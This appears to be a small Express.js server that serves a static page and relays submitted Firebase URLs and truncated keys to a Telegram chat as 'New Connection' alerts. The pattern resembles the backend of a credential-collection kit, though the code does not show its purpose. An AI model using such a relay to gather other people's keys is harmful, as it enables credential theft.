const express = require('express');
const path = require('path');
const app = express();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post('/api/forward', async (req, res) => {
  const { firebaseUrl, key, time } = req.body;
  if (!firebaseUrl) return res.status(400).json({ error: 'Missing firebaseUrl' });

  const message = `🔗 <b>New Connection</b>\n`
    + `🌐 URL: <code>${firebaseUrl}</code>\n`
    + (key ? `🔑 Key: <code>${key.substring(0, 15)}…</code>\n` : '')
    + `🕒 Time: ${time || '—'}`;

  try {
    const resp = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }
    );
    const data = await resp.json();
    if (!data.ok) throw new Error(data.description || 'Telegram API error');
    res.json({ ok: true });
  } catch (err) {
    console.error('Telegram forward error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
